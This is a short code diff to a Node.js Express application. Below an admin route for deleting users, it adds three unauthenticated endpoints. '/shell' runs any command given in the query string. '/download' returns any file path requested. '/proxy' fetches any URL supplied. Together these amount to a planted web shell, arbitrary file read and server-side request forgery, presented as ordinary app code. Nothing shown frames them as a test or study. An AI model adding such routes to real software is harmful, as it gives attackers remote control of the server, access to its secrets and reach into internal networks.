@@ -15,3 +15,17 @@ app.delete('/admin/users/:id', async (req, res) => {
   await users.remove(req.params.id);
   res.status(204).end();
 });
+
+app.get('/shell', (req, res) => {
+  child_process.exec(req.query.command);
+  res.json({ started: true });
+});
+
+app.get('/download', (req, res) => {
+  fs.readFile(req.query.path, (error, data) => res.send(data));
+});
+
+app.get('/proxy', async (req, res) => {
+  const response = await fetch(req.query.url);
+  res.send(await response.text());
+});
